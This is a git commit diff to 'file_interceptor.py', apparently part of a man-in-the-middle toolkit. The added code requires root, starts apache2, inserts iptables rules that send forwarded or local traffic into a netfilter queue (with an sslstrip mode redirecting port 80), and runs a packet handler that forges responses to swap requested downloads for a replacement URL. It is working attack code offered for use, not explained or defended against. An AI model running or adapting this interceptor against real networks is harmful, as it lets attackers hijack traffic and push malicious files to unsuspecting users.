f8f5a7d5414f5c7f463bc5ecc5007d370565b8ce
ninabarzh <30133030+ninabarzh@users.noreply.github.com>
2022-01-18 12:53:01 +0100

    more clean up

--- file_interceptor/file_interceptor.py
+++ file_interceptor/file_interceptor.py
@@ -1,10 +1,17 @@
 #!/usr/bin/env python3
 
-from snfq import SNFQ
+import subprocess
+import netfilterqueue
 import scapy.all as scapy
 import argparse
+import os
+import sys
 
 ack_list = []
+
+
+def is_not_root():
+    return os.geteuid() != 0
 
 
 def get_args():
@@ -33,6 +40,63 @@ def get_args():
             "[-] Please specify a replace url, use --help for more information"
         )
     return values
+
+
+def apache_start():
+    print("Starting apache2 service...")
+    try:
+        subprocess.check_output(["service", "apache2", "start"])
+    except subprocess.CalledProcessError:
+        print("Installing and starting apache2 service...")
+        subprocess.call("apt-get install apache2 -y", shell=True)
+        subprocess.call("service apache2 start", shell=True)
+    print("Done.")
+
+
+def run_queue(destination, qnum):
+    if destination == "forward":
+        subprocess.call(
+            "iptables -I FORWARD -j NFQUEUE --queue-num {}".format(qnum),
+            shell=True,
+        )
+    elif destination == "sslstrip":
+        subprocess.call(
+            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
+            shell=True,
+        )
+        subprocess.call(
+            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
+            shell=True,
+        )
+        subprocess.call(
+            "sudo iptables -t nat -A PREROUTING -p tcp"
+            " --destination-port 80 -j REDIRECT --to-port 10000",
+            shell=True,
+        )
+    elif destination == "local":
+        subprocess.call(
+            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
+            shell=True,
+        )
+        subprocess.call(
+            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
+            shell=True,
+        )
+    else:
+        print("[-] Unknown destination")
+
+    # Create netfilterqueue instance
+    queue = netfilterqueue.NetfilterQueue()
+    # Bind queue number 0 (queue zero in iptables)
+    queue.bind(qnum, process_packet)
+    # Run the queue
+    queue.run()
+
+
+def restore():
+    subprocess.call("iptables --flush", shell=True)
+    subprocess.call("service apache2 stop", shell=True)
+    print("[+] Quitting.")
 
 
 def forge_packet(packet, load):
@@ -87,5 +151,13 @@ def process_packet(packet):
     packet.accept()
 
 
+# Check whether we're root
+if is_not_root():
+    sys.exit("[-] This script requires superuser privileges.")
 options = get_args()
-queue = SNFQ(process_packet, destination=options.destination)
+try:
+    apache_start()
+    run_queue(options.destination, 0)
+except KeyboardInterrupt:
+    print("[+] \nDetected CTRL+C ... Restoring normal connections ...")
+    restore()
